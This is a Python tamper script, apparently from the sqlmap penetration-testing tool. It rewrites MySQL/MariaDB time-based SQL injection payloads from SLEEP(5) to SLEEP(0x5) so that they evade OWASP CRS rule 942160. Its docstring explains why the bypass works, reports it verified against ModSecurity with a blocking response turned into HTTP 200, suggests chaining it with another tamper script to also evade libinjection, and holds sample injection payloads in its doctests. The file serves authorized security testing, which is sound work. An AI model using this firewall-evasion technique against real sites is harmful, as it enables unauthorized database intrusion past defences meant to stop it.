#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Replaces (MySQL) instances like 'SLEEP(5)' with 'SLEEP(0x5)' counterpart

    Requirement:
        * MySQL
        * MariaDB

    Tested against:
        * MySQL 5.5.62, 5.7.44, 8.0.36, 8.0.46, 8.4.9, 9.4.0
        * Percona 8.0.46
        * MariaDB 10.7.8, 10.11.14, 11.4.12, 11.8.8, 12.0.2

    Notes:
        * Useful to bypass web application firewalls, as the OWASP CRS rule 942160
          '(?i:sleep\\(\\s*?\\d*?\\s*?\\)|benchmark\\(.*?\\,.*?\\))' only matches a run of plain
          decimal digits between the parentheses, while MySQL happily accepts a hexadecimal
          literal there
        * Verified against ModSecurity v3 with the OWASP CRS (paranoia level 1, blocking mode),
          where 'SLEEP(3)' scores 5 anomaly points and is blocked, while 'SLEEP(0x3)' scores 0
          and is answered with HTTP 200, the delay still being applied on all tested engines
        * Combine it with tamper script 'odbcbrace' to also clear rule 942100 (libinjection),
          e.g. --tamper=sleep2hex,odbcbrace
        * 'SLEEP(5.0)' works just as well, for the same reason

    >>> tamper('1 AND SLEEP(5)')
    '1 AND SLEEP(0x5)'
    >>> tamper('1 AND (SELECT SLEEP( 12 ))')
    '1 AND (SELECT SLEEP(0xc))'
    >>> tamper('1 AND SLEEP(0)')
    '1 AND SLEEP(0x0)'
    >>> tamper('1 AND 1=1')
    '1 AND 1=1'
    """

    return re.sub(r"(?i)\bSLEEP\(\s*(\d+)\s*\)", lambda match: "SLEEP(%s)" % hex(int(match.group(1))), payload) if payload else payload
